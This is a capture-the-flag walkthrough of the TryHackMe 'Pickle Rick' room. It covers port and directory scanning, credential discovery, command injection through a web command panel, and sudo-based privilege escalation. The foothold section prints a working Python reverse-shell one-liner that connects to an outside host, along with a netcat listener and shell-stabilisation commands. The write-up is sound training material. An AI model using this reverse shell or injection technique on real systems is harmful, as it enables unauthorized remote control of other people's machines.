---
title: TryHackMe Pickle Rick [CHALLENGE]
date: 2024-03-09 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg
---
A Rick and Morty CTF. Help turn Rick back into a human! Know basic network service exploitation and linux command line.

## **Reconnaissance**

```bash
nmap -sC -sV -p- $TARGET_IP --open
```
`-sV`: Enables version detection, which attempts to determine the version of services running on open ports.

`-sC`: Enables default script scanning, executing a set of scripts to discover additional information and potential vulnerabilities.

`-p-`: Scans all 65,535 TCP ports, allowing for thorough port enumeration.

`TARGET_IP`: Specifies the target IP address.

`--open`: Shows only open ports in the output, filtering out closed and filtered ports.


```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 02:33 EST
Nmap scan report for 10.10.22.145
Host is up (0.31s latency).
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a4:5b:39:c3:e5:48:9d:dd:d1:61:8a:33:57:10:2b:82 (RSA)
|   256 a4:d4:00:71:84:6c:ff:08:3d:d5:b0:b6:b9:04:7a:9b (ECDSA)
|_  256 c6:0a:68:60:ad:2b:ae:88:d0:3d:4c:a6:1c:99:70:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Based on the Nmap scan results, the target system has two open ports with the following services.
- Port 22/tcp: OpenSSH 7.2p2 running on Ubuntu Linux.
- Port 80/tcp: Apache HTTP Server 2.4.18 running on Ubuntu.

## **Insights**
---
- 80 HTTP
    - Web server is running, we can try accessing that.
	- There is a public facing website with an Apache HTTP Server with a `version 2.4.18` running on `Ubuntu`

- 22 SSH
    - We need some credentials to access this and bruteforcing can take a really long time before the credentials can be cracked. Hence, this is the least of our priorities for pentesting.

## **Enumeration**
---

### 80 HTTP

Before anything else, let us first check how the website looks like.

![Desktop View](/assets/images/pickle-rick/webpage.png){: width="972" height="589" }

Inspecting the source code gave us something helpful!

![Desktop View](/assets/images/pickle-rick/page-source.png){: width="972" height="589" }
> Username: R1ckRul3s
{: .prompt-tip }
Now let us scan what other directories this website can give using **`gobuster`**

```bash
gobuster dir -u $TARGET_IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t20
```
**`-w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`**: Specifies the wordlist (dictionary) file to use for directory and file names.

**`-t 20`**: Sets the number of concurrent threads to 30, which means it will perform 30 requests simultaneously.

```text
/assets               (Status: 301) [Size: 313] [--> http://10.10.18.137/assets/]
/server-status        (Status: 403) [Size: 300]
```
Looks like we have some interesting directories here.

![Desktop View](/assets/images/pickle-rick/assets-page.png){: width="972" height="589" }

The `/assets ` can be significant as it might allow users to execute the uploaded file on the server. Or maybe what's interesting is that we have a `portal.jpg`which tell us there could be some sort of login form especially we got some username.

![Desktop View](/assets/images/pickle-rick/server-stats.png){: width="972" height="589" }

The `/server-status` seems to be inaccessible

How about `FILE Busting`?

```bash
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30
```

```text
/login.php            (Status: 200) [Size: 882]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/.                    (Status: 200) [Size: 1062]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
```
In this web server enumeration, two interesting endpoints stand out for further exploration `/robots.txt` and `/login.php`. 

![Desktop View](/assets/images/pickle-rick/robots.png){: width="972" height="589" }

`/robots.txt` file is often used by website administrators to give instructions to web crawlers and bots about which pages or directories they should or shouldn't access.

![Desktop View](/assets/images/pickle-rick/login.png){: width="972" height="589" }

`/login.php` endpoint appears to be a login page that we can use to possibly login using credentials we have found from robots.txt and source code.


## **Gaining an Initial Foothold**

Upon logging in, it looks like we can execute some linux command on the command panel. You can try entering all the linux commands you like and see if it is working. This is called `Command injection`, a security vulnerability that occurs when an attacker is able to inject and execute arbitrary commands or code within an application's system command execution function. 

This vulnerability typically arises due to insufficient input validation or improper handling of user-controlled data by the application.

See <https://owasp.org/www-community/attacks/Command_Injection>

It looks like the `cat` Linux command is not functioning. Maybe try using other alternatives that has a similar function. I tried searching for an alternative. See <https://linuxhandbook.com/view-file-linux/>


![Desktop View](/assets/images/pickle-rick/first.png){: width="972" height="589" }

> Do not forget to find first ingredient
{: .prompt-danger }

Alternatively, we are also able to get a reverse shell from the command panel to get a more robust control over the target machine. But first, let’s us check if there is a python binary installed on the system.

```bash
which python
or
which python3
```
![Desktop View](/assets/images/pickle-rick/python3.png){: width="972" height="589" }

As we can see python3 is installed, which means we can be able to get a python reverse shell. On the command panel, we can enter:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
> Do not forget to change the IP and port
{: .prompt-warning }

Before entering the command on the panel, setup a netcat listener to catch a reverse-shell 

```bash
nc -lnvp <PORT>
```

Upon entering, you should catch a reverse shell by now from the netcat listener we have established earlier.

![Desktop View](/assets/images/pickle-rick/revshell.png){: width="972" height="589" }

This is a dumb shell and we have to stabilise it to have a more beautiful and functional shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear -lsaht --color=auto'

Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
![Desktop View](/assets/images/rootme/stable-shell.png){: width="972" height="589" }

Thanks to S1REN! <https://sirensecurity.io/blog/break-out-get-that-tty/>

> Do not forget to find the second ingredient
{: .prompt-warning }



## **Privilege Escalation**

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file.

We found that the permissions granted to the user `www-data` on the system has `(ALL) NOPASSWD: ALL` which means that the user `www-data` is allowed to run any command `(ALL)` with `sudo` privileges without being prompted for a password `(NOPASSWD)`.

Technically, this means that `www-data` can execute any command with elevated privileges without needing to enter a password, just like the `root user`.

![Desktop View](/assets/images/pickle-rick/def-priv.png){: width="972" height="589" }

> Do not forget to find the FINAL INGREDIENT
{: .prompt-danger }

## TAKE AWAY CONCEPTS
- Try using alternative linux commands
- Try file busting to find possible directories.
- Always check the sudo privilege before attempting for privilege escalation
- Try finding a vulnerability on the web application first before bruteforcing SSH.